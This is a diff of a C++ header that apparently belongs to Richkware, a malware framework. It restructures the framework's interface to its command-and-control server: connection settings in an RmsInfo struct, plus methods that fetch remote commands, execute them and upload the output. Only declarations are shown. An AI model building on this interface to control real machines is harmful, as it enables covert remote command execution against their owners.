@@ -31,6 +31,28 @@
 #include "network.h"
 #include "storage.h"
 
+/**
+ * Structure containing all information to connect with Richkware-Manager-Server
+ */
+struct RmsInfo {
+    const char *defaultEncryptionKey;
+    const char *serverAddress;
+    const char *port;
+    const char *serviceName;
+    const char *associatedUser;
+
+/**
+ *
+ * @param defaultEncryptionKey: pre-shared key with RMS, to enable encryption before receiving a server-side generated key
+ * @param serverAddress: Richkware-Manager-Server IP address
+ * @param port: Richkware-Manager-Server TCP port
+ * @param serviceName: Richkware-Manager-Server service name
+ * @param associatedUser: account in RMS which is linked to
+ */
+    RmsInfo(const char *defaultEncryptionKey, const char *serverAddress, const char *port, const char *serviceName,
+            const char *associatedUser);
+};
+
 class Richkware {
 private:
     std::string appName;
@@ -43,10 +65,10 @@ public:
 
     Richkware(const char *AppNameArg, std::string EncryptionKeyArg);
 
-    //Get secure key from Richkware-Manager-Server and set it as encryption key. DefaultPass is used as temporary encryption key to ensure a safety communication with RMS and if this app cannot reach the RMS, then it will use DefaultPass as encryption key.
-    Richkware(const char *AppNameArg, const std::string &defaultEncryptionKey, const char *serverAddress,
-              const char *port,
-              const char *associatedUser);
+    // Get secure key from Richkware-Manager-Server and set it as encryption key. DefaultPass is used as temporary
+    // encryption key to ensure a safety communication with RMS and if this app cannot reach the RMS, then it will
+    // use DefaultPass as encryption key.
+    Richkware(const char *AppNameArg, RmsInfo rmsInfo);
 
     BOOL IsAdmin();
 
@@ -62,11 +84,11 @@ public:
 
     void RandMouse();
 
-    std::vector<std::string> getCommands(const std::string &encryptionKey);
+    std::vector<std::string> getCommands();
 
     std::string executeCommand(std::string command);
 
-    void uploadCommandsResponse(std::string output, const std::string &encryptionKey);
+    void uploadCommandsResponse(std::string output);
 
 };
 
